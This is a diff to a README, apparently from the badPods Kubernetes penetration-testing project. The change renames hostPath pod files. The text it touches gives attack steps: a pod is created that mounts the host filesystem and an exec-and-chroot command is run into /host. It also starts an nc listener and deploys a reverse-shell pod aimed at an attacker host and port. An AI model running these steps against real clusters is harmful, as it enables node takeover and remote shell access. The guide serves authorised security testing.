@@ -4,25 +4,25 @@ If there are no pod admission controllers applied,or a really lax policy, you ca
 # Pod Creation
 
 ### Create a pod you can exec into
-[pod-hostpath-only.yaml](pod-hostpath-only.yaml)
+[pod-hostpath.yaml](pod-hostpath.yaml)
 
 #### Option 1: Create pod from local yaml 
 ```bash
-kubectl apply -f pod-hostpath-only.yaml  
+kubectl apply -f pod-hostpath.yaml  
 ```
 
 #### Option 2: Create pod from github hosted yaml
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpath-only/pod-hostpath-only.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpath/pod-hostpath.yaml  
 ```
 
 #### Exec into pod 
 ```bash
-kubectl -n [namespace] exec -it pod-hostpath-only -- chroot /host
+kubectl -n [namespace] exec -it pod-hostpath -- chroot /host
 ```
 
 ### Or, create a reverse shell pod
-[pod-hostpath-only.yaml-revshell.yaml](pod-hostpath-only.yaml-revshell.yaml)
+[pod-hostpath.yaml-revshell.yaml](pod-hostpath.yaml-revshell.yaml)
 
 #### Set up listener
 ```bash
@@ -33,7 +33,7 @@ nc -nvlp 3116
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
 HOST="10.0.0.1" PORT="3116" 
-envsubst < ./yaml/hostpath-only/pod-hostpath-only.yaml-revshell.yaml | kubectl apply -f -
+envsubst < ./yaml/hostpath/pod-hostpath.yaml-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
